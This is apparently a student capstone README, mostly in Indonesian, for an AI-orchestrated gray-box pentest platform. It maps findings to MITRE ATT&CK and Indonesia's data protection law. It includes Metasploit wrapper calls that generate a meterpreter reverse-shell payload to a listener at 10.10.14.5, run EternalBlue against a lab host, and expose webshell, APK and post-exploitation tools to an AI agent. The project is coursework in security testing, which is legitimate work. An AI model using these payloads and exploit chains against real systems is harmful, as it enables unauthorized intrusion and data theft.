# Project Unified-Shield: AI-Driven Defense & Compliance

> **Capstone Project Cybersecurity 2026 — Kelompok 7**
> Framework: MITRE ATT&CK + UU No. 27 Tahun 2022 (UU PDP)
> Pendekatan: Gray Box Penetration Testing dengan AI Agent Orchestration

---

## 📌 Executive Summary

Project Unified-Shield adalah sistem **AI-driven penetration testing dan compliance auditing** yang mengintegrasikan empat domain keamanan siber:

1. **Offensive Security** — Gray box penetration testing dengan credential-based access
2. **Exploitation** — Metasploit Framework integration untuk payload generation dan exploit execution
3. **Threat Intelligence** — Mapping otomatis ke framework MITRE ATT&CK Enterprise (data real dari STIX dataset)
4. **Legal Compliance** — Pemetaan temuan teknis ke UU No. 27 Tahun 2022 tentang Perlindungan Data Pribadi

Sistem ini dirancang untuk **Modul C (Penetration Testing & PDP Compliance)** dan **Project 4 (Integrasi Sinergis)** dari Capstone Project Cybersecurity 2026, dengan target infrastruktur **PT. Dana Sejahtera (Fintech Infrastructure)**.

---

## 🏗️ Arsitektur Sistem

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    UNIFIED-SHIELD PLATFORM                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐   ┌──────────────┐   ┌──────────────────────┐ │
│  │  OFFENSIVE   │──▶│ EXPLOITATION │──▶│   INTELLIGENCE       │ │
│  │   LAYER      │   │    LAYER     │   │      LAYER           │ │
│  │              │   │              │   │                      │ │
│  │ • Nmap       │   │ • msfvenom   │   │ • MITRE              │ │
│  │ • Nuclei     │   │ • msfconsole │   │   ATT&CK             │ │
│  │ • FFUF       │   │ • Payloads   │   │   (858 tech)         │ │
│  │ • SQLMap     │   │ • Sessions   │   │                      │ │
│  │ • Dalfox     │   │ • Post-Exp   │   │                      │ │
│  └──────────────┘   └──────────────┘   └──────────────────────┘ │
│         │                   │                   │                │
│         ▼                   ▼                   ▼                │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │              UNIFIED AI AGENT ORCHESTRATOR                │   │
│  │                                                           │   │
│  │ • Security Tools Bridge (120+ MCP tools)                │   │
│  │ • Metasploit MCP Server (20+ tools)                     │   │
│  │ • MITRE Attack Mapper (333 techniques, 48 articles)     │   │
│  │ • Credential Manager (multi-account gray box)           │   │
│  │ • Report Generator (MITRE + UU PDP + Sigma Rules)       │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Komponen Utama

| Layer | Komponen | Fungsi |
|-------|----------|--------|
| **Offensive** | Security Tools Bridge | Eksekusi alat pentest (Nmap, Nuclei, FFUF, SQLMap, Dalfox) |
| **Exploitation** | Metasploit MCP Server | Payload generation, exploit execution, post-exploitation |
| **Intelligence** | MITRE ATT&CK Mapper | Mapping 333 teknik serangan ke 14 taktik MITRE |
| **Compliance** | RAG System (ChromaDB) | 340 chunks UU PDP dengan semantic search |
| **Orchestration** | UnifiedAIAgent | Koordinasi pentest → MITRE → UU PDP → Report |
| **Credential** | Credential Manager | Multi-account gray box (attacker, victim, admin) |

---

## 🔧 Struktur Project

```
Kelompok 7/
├── README.md                          # Dokumentasi utama (file ini)
├── CLAUDE.md                          # AI Agent configuration & workflow
├── Rules_of_Engagement.md             # Rules of Engagement (RoE)
├── GRAYBOX_QUICKSTART.md              # Quick start guide gray box testing
│
├── # Core System
├── agent_orchestrator.py              # AI Agent Orchestrator (main entry)
├── tools_bridge.py                    # Security Tools Bridge + MITRE integration
├── index_uu_pdp.py                    # RAG Indexer: PDF → ChromaDB
│
├── # MITRE ATT&CK Integration
├── mitre_attack_db.json               # Database real MITRE STIX (858 techniques)
├── scripts/
│   ├── mitre_attack_mapper.py         # MITRE Mapper: action → technique → UU PDP
│   ├── credential_manager.py          # Credential Manager: multi-account gray box
│   ├── mcp_metasploit.py              # MCP Server: msfvenom + msfconsole integration
│   └── install_metasploit.sh          # Metasploit installer
│
├── # AI Agent Skills
├── skills/
│   ├── api_pentest.md                 # Skill: Autonomous API Pentester
│   ├── pdp_compliance_auditor.md      # Skill: PDP Compliance Auditor
│   └── mitre_attack_mapper.md         # Skill: MITRE ATT&CK Mapper
│
├── # RAG Database
├── db_uu_pdp/                         # ChromaDB vector store (340 chunks)
├── UU Nomor 27 Tahun 2022.pdf         # Source document UU PDP
│
├── # Configuration
├── .env.graybox                       # Gray box credentials (gitignored)
├── .venv/                             # Python virtual environment
├── .opencode/
│   └── opencode.jsonc                 # OpenCode MCP configuration
│
├── # Runner
├── run_graybox.py                     # One-command gray box pentest runner
│
└── # Reports & Outputs
    ├── pentest-report-login-logs.md   # Sample pentest report
    ├── Final_Unified_Audit_Report.md  # Generated unified audit report
    └── Remediation_Roadmap.md         # Remediation roadmap
```

---

## 🛠️ Deliverables Teknis

### 1. RAG Indexing System (`index_uu_pdp.py`)

Sistem indexing UU PDP ke Vector Database:

- **Input:** PDF UU No. 27 Tahun 2022 (77 Pasal)
- **Proses:** Semantic chunking berbasis nomor Pasal
- **Output:** ChromaDB dengan 340 chunks vektor
- **Embedding Model:** `paraphrase-multilingual-MiniLM-L12-v2` (multilingual)

```bash
python index_uu_pdp.py
```

### 2. MITRE ATT&CK Integration

Database real dari MITRE STIX dataset dengan mapping komprehensif:

| Metric | Value |
|--------|-------|
| Source | MITRE official STIX dataset (GitHub) |
| Total Techniques | 858 (Enterprise ATT&CK) |
| Techniques Mapped | 333 (pentest-relevant) |
| UU PDP Articles Covered | **48/48 (100%)** |
| Total Technique-Pasal Mappings | 1,014 |
| Taktik MITRE | 14 (Reconnaissance → Impact) |

```python
from scripts.mitre_attack_mapper import MitreAttackMapper

mapper = MitreAttackMapper()
result = mapper.map_action("login_with_credentials", evidence="Staff login OK", severity="Medium")
# Output: T1078 (Valid Accounts) → Pasal 23, 35, 36, 39, 65
```

### 3. Security Tools Bridge (`tools_bridge.py`)

Bridge yang mengintegrasikan 120+ MCP security tools dengan MITRE ATT&CK mapping:

| Kategori | Tools | Contoh |
|----------|-------|--------|
| **Reconnaissance** | Nmap, FFUF, Subfinder, Whatweb | Service discovery, endpoint enumeration |
| **Vulnerability** | Nuclei, SQLMap, Dalfox, Nikto | CVE scanning, SQLi, XSS detection |
| **API Testing** | Kiterunner, Arjun, Swagger | Hidden API discovery, parameter fuzzing |
| **Credential** | Hydra, John | Brute force, password cracking |
| **SAST** | Semgrep, Bandit, Brakeman | Static code analysis |
| **WAF Bypass** | WAF Engine, Adaptive Bypass | Cloudflare, AWS WAF evasion |

```python
from tools_bridge import SecurityToolsBridge

bridge = SecurityToolsBridge()
bridge.set_target("https://api.bank-pdp.local")
bridge.set_auth_token("jwt_token_here", role="staff")
bridge.start_mitre_chain("graybox-001")

# Auto-mapped to MITRE + UU PDP
bridge.log_finding("login_with_credentials", "Staff login OK", "Medium", "/api/v1/auth/login")
# → T1078 (Valid Accounts) → Pasal 23, 35, 36, 39, 65
```

### 4. Metasploit MCP Server (`scripts/mcp_metasploit.py`)

Integrasi Metasploit Framework sebagai MCP server untuk payload generation dan exploit execution:

| Tool | Fungsi | Contoh Penggunaan |
|------|--------|-------------------|
| **msfvenom** | Payload generation | Reverse shells, webshells, Android APKs, shellcode |
| **msfconsole** | Exploit execution | Module search, exploit run, session management |
| **Resource Scripts** | Automated chains | Multi-step attack automation |

```python
# Generate payload
msfvenom_generate_payload(
    payload="linux/x64/meterpreter/reverse_tcp",
    lhost="10.10.14.5",
    lport="4444",
    format="elf",
    output_file="/tmp/payload.elf"
)

# Start handler
msfconsole_start_handler(
    payload="multi/handler",
    lhost="10.10.14.5",
    lport="4444",
    handler_type="reverse_tcp",
    run=True
)

# Search exploits
msfconsole_search(query="smb", search_type="exploit")

# Execute exploit
msfconsole_exploit(
    module="exploit/windows/smb/ms17_010_eternalblue",
    rhost="10.10.10.40",
    payload="windows/x64/meterpreter/reverse_tcp",
    lhost="10.10.14.5",
    lport="4444"
)
```

**Available MCP Tools (20+ tools):**
- `msfvenom_list_payloads`, `msfvenom_list_formats`, `msfvenom_list_encoders`
- `msfvenom_generate_payload`, `msfvenom_generate_shellcode`
- `msfvenom_generate_webshell`, `msfvenom_generate_android_apk`
- `msfconsole_execute`, `msfconsole_start_handler`, `msfconsole_search`
- `msfconsole_exploit`, `msfconsole_auxiliary`, `msfconsole_post`
- `msfconsole_sessions`, `msfconsole_session_command`, `msfconsole_resource_script`
- `msfconsole_db_status`, `msfconsole_workspace`, `msfconsole_hosts`, `msfconsole_services`

### 5. Credential Manager (`scripts/credential_manager.py`)

Sistem manajemen kredensial untuk gray box testing dengan multi-account support:

| Role | Fungsi | Testing Scenario |
|------|--------|-----------------|
| **Attacker** | Akun staff | Initial access, discovery, horizontal IDOR |
| **Victim** | Akun user | Target IDOR testing, data exposure |
| **Admin** | Akun admin | Privilege escalation, vertical IDOR |

```bash
# Interactive setup
python run_graybox.py --setup

# Quick run
python run_graybox.py --target https://target.api --cookie "jms_sessionid=abc123"

# Check status
python run_graybox.py --status
```

### 6. AI Agent Orchestrator (`agent_orchestrator.py`)

Pusat kendali yang mengkoordinasikan seluruh workflow:

```
Step 1: ATTACK CHAINING (MITRE ATT&CK)
  ├── Phase 1: Initial Access → T1078 (Valid Accounts)
  ├── Phase 2: Discovery → T1087, T1046, T1069
  ├── Phase 3: Exploitation → T1210 (BOLA), T1068 (Priv Esc)
  └── Phase 4: Impact → T1213 (Data Collection)

Step 2: LEGAL AUDIT (RAG + UU PDP)
  ├── Query: "pelanggaran data pribadi akses tidak sah"
  ├── Retrieve: 3 relevant passages from ChromaDB
  └── Map: Technical finding → Legal article → Sanctions

Step 3: GENERATING UNIFIED REPORT
  ├── Technical evidence (PoC)
  ├── MITRE ATT&CK mapping (Navigator layer)
  ├── UU PDP legal mapping (Pasal 35, 38, 39, 46, 57)
  ├── Sigma Rules for Wazuh SIEM
  └── Remediation recommendations
```

---

## 📊 MITRE ATT&CK Mapping

### Technique Coverage by Tactic

| Tactic | Techniques | Contoh Teknik | UU PDP Articles |
|--------|-----------|---------------|-----------------|
| **Reconnaissance** | 8 | T1595 (Active Scanning) | Pasal 31, 38 |
| **Initial Access** | 6 | T1078 (Valid Accounts), T1190 (Exploit Public App) | Pasal 23, 35, 36, 39, 65 |
| **Discovery** | 30 | T1087 (Account Discovery), T1046 (Service Discovery) | Pasal 28, 31, 32, 38 |
| **Credential Access** | 42 | T1539 (Steal Cookie), T1552 (Unsecured Creds) | Pasal 24, 25, 26, 35, 36, 39 |
| **Privilege Escalation** | 25 | T1068 (Exploit for Priv Esc), T1098 (Account Manipulation) | Pasal 28, 35, 36, 39 |
| **Defense Evasion** | 42 | T1070 (Indicator Removal), T1562 (Impair Defenses) | Pasal 31, 33, 35, 36, 37, 47, 49, 50, 53, 54 |
| **Lateral Movement** | 18 | T1210 (Remote Services), T1021 (Remote Services) | Pasal 38, 39, 51 |
| **Collection** | 28 | T1005 (Local System), T1213 (Info Repositories) | Pasal 16, 17, 18, 27, 35, 38 |
| **Command & Control** | 22 | T1071 (App Layer Protocol), T1102 (Web Service) | Pasal 19, 31, 35, 38, 51 |
| **Exfiltration** | 16 | T1567 (Over Web Service), T1041 (Over C2) | Pasal 35, 38, 45, 46, 55 |
| **Impact** | 15 | T1486 (Data Encrypted), T1485 (Data Destruction) | Pasal 30, 35, 36, 41, 43, 44, 45, 46, 48, 57, 66, 67, 68, 69, 71, 73 |
| **Execution** | 14 | T1059 (Command Interpreter), T1648 (Serverless) | Pasal 35, 36, 39 |
| **Persistence** | 14 | T1136 (Create Account), T1133 (Remote Services) | Pasal 35, 36, 39, 51 |
| **Resource Development** | 8 | T1583 (Acquire Infrastructure) | Pasal 38, 65 |

### Attack Chain Example

```
Gray Box Pentest → MITRE ATT&CK Chain → UU PDP Mapping

1. Login dengan staff credentials
   → T1078 (Valid Accounts) [Initial Access]
   → Pasal 23 (persetujuan), 35 (keamanan), 36 (langkah teknis), 39 (akses tidak sah), 65 (larangan memperoleh data)

2. Enumerate user accounts
   → T1087 (Account Discovery) [Discovery]
   → Pasal 32 (hak akses subjek), 38 (perlindungan tidak sah), 39 (akses tidak sah)

3. Test IDOR pada /api/v1/users/{id}
   → T1210 (Remote Services Exploitation) [Lateral Movement]
   → Pasal 38 (perlindungan tidak sah), 39 (akses tidak sah), 51 (kewajiban prosesor)

4. Mass assignment: role=staff → role=admin
   → T1068 (Exploitation for Privilege Escalation) [Privilege Escalation]
   → Pasal 35 (keamanan data), 36 (langkah teknis), 39 (akses tidak sah)

5. Extract user PII via IDOR
   → T1213 (Data from Information Repositories) [Collection]
   → Pasal 16 (pemrosesan data), 35 (keamanan data), 38 (perlindungan tidak sah)

6. Exfiltrate large dataset
   → T1567 (Exfiltration Over Web Service) [Exfiltration]
   → Pasal 35 (keamanan), 38 (perlindungan), 45 (notifikasi), 46 (kegagalan), 55 (transfer data)

7. Exploit known CVE (e.g., EternalBlue on exposed SMB)
   → T1210 (Exploitation of Remote Services) [Lateral Movement]
   → msfconsole_exploit(module="exploit/windows/smb/ms17_010_eternalblue")
   → Pasal 35 (keamanan data), 36 (langkah teknis), 39 (akses tidak sah), 67 (pidana)
```

---

## ⚖️ UU PDP Compliance Mapping

### Coverage: 48/48 Articles (100%)

| Pasal | Topik | MITRE Techniques | Risk Description |
|-------|-------|-----------------|------------------|
| **Pasal 16** | Pemrosesan Data | 33 | Pengumpulan/pemrosesan data tanpa otorisasi |
| **Pasal 17** | Data Visual (CCTV) | 2 | Screen/video capture tanpa persetujuan |
| **Pasal 23** | Persetujuan | 1 | Akses tanpa persetujuan valid |
| **Pasal 28** | Pemrosesan Terbatas | 25 | Pemrosesan melebihi tujuan awal |
| **Pasal 31** | Perekaman Kegiatan | 119 | Penghapusan log/audit trail |
| **Pasal 32** | Hak Akses Subjek | 9 | Penemuan akun/data tanpa otorisasi |
| **Pasal 35** | Keamanan Data | 261 | Kegagalan melindungi data pribadi |
| **Pasal 36** | Langkah Teknis | 159 | Tidak ada langkah teknis keamanan |
| **Pasal 38** | Perlindungan Tidak Sah | 147 | Akses/pemrosesan tanpa otorisasi |
| **Pasal 39** | Pencegahan Akses Tidak Sah | 126 | Akses tidak sah terhadap data pribadi |
| **Pasal 46** | Notifikasi Kegagalan | 21 | Tidak ada notifikasi breach 3x24 jam |
| **Pasal 57** | Sanksi Administratif | 20 | Pelanggaran dikenai sanksi administratif |
| **Pasal 65-69** | Ketentuan Pidana | 27 | Pelanggaran pidana data pribadi |
| **Pasal 71-73** | Sanksi Pidana | 9 | Pidana tambahan dan ganti rugi |

### Legal Risk Matrix

| Severity | UU PDP Article | MITRE Tactic | Sanction |
|----------|---------------|--------------|----------|
| **Critical** | Pasal 67, 68, 69 | Impact | Pidana penjara + denda |
| **High** | Pasal 35, 39, 46 | Initial Access, Exfiltration | Sanksi administratif + pidana |
| **Medium** | Pasal 28, 31, 32, 38 | Discovery, Collection | Sanksi administratif |
| **Low** | Pasal 16, 17, 23 | Reconnaissance | Peringatan administratif |

---

## 🎯 Gray Box Testing Workflow

### Setup (Sekali)

```bash
# 1. Setup credentials
python run_graybox.py --setup

# Atau edit langsung
nano .env.graybox
```

### Execution (Tinggal Run)

```bash
# Full pentest dengan auto-mapping
python run_graybox.py

# Output:
# ├── graybox-<chain>-report.md       # Full report
# ├── graybox-<chain>-navigator.json  # ATT&CK Navigator layer
# └── graybox-<chain>-chain.json      # Chain report JSON
```

### Phases

```
Phase 1: Initial Access
  ├── Login dengan credentials → T1078
  └── Capture session details → T1539

Phase 2: Discovery
  ├── Account discovery → T1087
  ├── API endpoint discovery → T1046
  └── Permission discovery → T1069

Phase 3: Exploitation
  ├── BOLA/IDOR testing → T1210
  ├── Mass assignment → T1098
  └── Privilege escalation → T1068

Phase 3.5: Metasploit Exploitation (Conditional)
  ├── Search exploits for detected services → msfconsole_search
  ├── Generate custom payloads → msfvenom_generate_payload
  ├── Execute known CVE exploits → msfconsole_exploit
  └── Post-exploitation enumeration → msfconsole_post

Phase 4: Impact Assessment
  ├── Data collection → T1005, T1213
  ├── Data exfiltration → T1567
  └── Impact analysis → T1485, T1486
```

---

## 🔄 Integrasi Sinergis (Project 4)

### Sinergi Antar Modul

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  MODUL A    │     │  MODUL B    │     │  MODUL C    │     │  MODUL D    │
│  SIEM/Wazuh │◀───▶│  Threat     │◀───▶│  AI Agent   │◀───▶│ Metasploit  │
│             │     │  Hunting    │     │  Pentest    │     │ MCP Server  │
└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
       │                    │                    │                    │
       ▼                    ▼                    ▼                    ▼
  Deteksi serangan    Investigasi IOC      Generate Sigma     Payload & Exploit
  dari AI Agent       dari AI Agent        Rules + MITRE      Execution + Post-Exp
  → Alert SIEM        → Threat Intel       → Detection Rules  → Session Mgmt
```

### Alur Sinergi

1. **AI Agent (Modul C)** menjalankan pentest → generate temuan dengan MITRE mapping
2. **Metasploit MCP (Modul D)** mengeksekusi exploit untuk known CVE → payload generation & session management
3. **Wazuh SIEM (Modul A)** mendeteksi serangan dari AI Agent melalui Sigma Rules
4. **Threat Hunting (Modul B)** menggunakan IOC dari AI Agent untuk investigasi
5. **Feedback loop:** Deteksi SIEM → validasi temuan → update AI Agent rules → refine exploit strategy

---

## 📋 Rubrik Penilaian (Project 4)

| Kriteria (Bobot) | Implementasi | Bukti |
|------------------|-------------|-------|
| **Integrasi Sistem (25%)** | AI Agent ↔ Wazuh SIEM ↔ Threat Hunting | Sigma Rules, IOC feed, alert correlation |
| **Ketajaman Teknis (25%)** | MITRE ATT&CK mapping (333 techniques), 140+ MCP tools, Metasploit integration | Navigator layer, chain report, PoC, payload generation |
| **Analisis Hukum PDP (20%)** | 48/48 UU PDP articles mapped, RAG-based legal audit | Legal mapping matrix, sanctions reference |
| **Otomasi & Efisiensi (15%)** | One-command runner, auto-report generation | `run_graybox.py`, credential manager |
| **Presentasi (15%)** | Dokumentasi lengkap, slide-ready | README.md, reports, quickstart guide |

---

## 🚀 Deployment & Usage

### Prerequisites

```bash
# Python 3.x with virtual environment
source .venv/bin/activate

# Install dependencies
pip install langchain langchain-chroma langchain-community huggingface-hub

# Security tools (tersedia di sistem)
# nmap, nuclei, ffuf, sqlmap, dalfox, whatweb, subfinder
# msfconsole, msfvenom (Metasploit Framework 6.4.134)
```

### Quick Start

```bash
# 1. Index UU PDP (first time only)
python index_uu_pdp.py

# 2. Setup gray box credentials
python run_graybox.py --setup

# 3. Run full pentest workflow
python run_graybox.py

# 4. Review reports
cat graybox-*-report.md
```

### CLI Reference

| Command | Fungsi |
|---------|--------|
| `/pentest` | Full gray box pentest via OpenCode slash command (credentials → MITRE → CVSS → UU PDP → MD + PDF) |
| `python run_graybox.py` | Run gray box pentest dengan stored credentials |
| `python run_graybox.py --setup` | Interactive credential setup |
| `python run_graybox.py --status` | Show credential status |
| `python run_graybox.py --target URL --token TOKEN` | Quick run tanpa setup |
| `python run_graybox.py --proxy http://127.0.0.1:8080` | Run dengan Burp Suite proxy |
| `python index_uu_pdp.py` | Re-index UU PDP ke ChromaDB |
| `python agent_orchestrator.py` | Run orchestrator langsung |
| `python scripts/mcp_metasploit.py` | Start Metasploit MCP server (msfvenom + msfconsole) |

---

## 📁 Output Artifacts

### Reports

| File | Format | Content |
|------|--------|---------|
| `graybox-<chain>-report.md` | Markdown | Full pentest report (MITRE + UU PDP) |
| `graybox-<chain>-report.pdf` | PDF | Professional styled PDF report |
| `graybox-<chain>-navigator.json` | JSON | ATT&CK Navigator layer (visual heatmap) |
| `graybox-<chain>-chain.json` | JSON | Chain report (techniques, tactics, articles) |
| `payloads/` | Binary | Generated Metasploit payloads (if used) |

### ATT&CK Navigator

Load `navigator.json` ke [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) untuk visual heatmap:

- **Red:** Initial Access techniques
- **Yellow:** Discovery techniques
- **Magenta:** Credential Access
- **Orange:** Privilege Escalation
- **Cyan:** Collection
- **Blue:** Exfiltration
- **Purple:** Impact

---

## 📚 Referensi

### Framework & Standards

- [MITRE ATT&CK Enterprise](https://attack.mitre.org/) — Framework threat intelligence
- [OWASP API Security Top 10](https://owasp.org/API-Security/) — API vulnerability reference
- [CWE Database](https://cwe.mitre.org/) — Common Weakness Enumeration

### Legal

- UU No. 27 Tahun 2022 — Perlindungan Data Pribadi
- PP No. 71 Tahun 2019 — Penyelenggaraan Sistem Elektronik
- Perkominfo No. 20 Tahun 2016 — Perlindungan Data Pribadi

### Tools

- [Nmap](https://nmap.org/) — Network scanner
- [Nuclei](https://nuclei.projectdiscovery.io/) — Vulnerability scanner
- [FFUF](https://github.com/ffuf/ffuf) — Web fuzzer
- [SQLMap](https://sqlmap.org/) — SQL injection tool
- [Dalfox](https://github.com/hahwul/dalfox) — XSS scanner
- [Metasploit Framework](https://www.metasploit.com/) — Exploitation framework (msfvenom + msfconsole)
- [ChromaDB](https://www.trychroma.com/) — Vector database

---

## 👥 Tim

**Kelompok 7 — Capstone Project Cybersecurity 2026**

| Role | Deskripsi |
|------|-----------|
| **Target** | PT. Dana Sejahtera (Fintech Infrastructure) |
| **Scope** | https://api.bank-pdp.local/v1/* |
| **Platform** | JumpServer (10.10.10.101) |
| **SIEM** | Wazuh HA Cluster |

---

## 📄 License

Project ini dibuat untuk keperluan akademik Capstone Project Cybersecurity 2026.

---

**Project Status:** 🟢 *Production Ready — Full MITRE + UU PDP + Metasploit Integration*
**Last Updated:** May 17, 2026
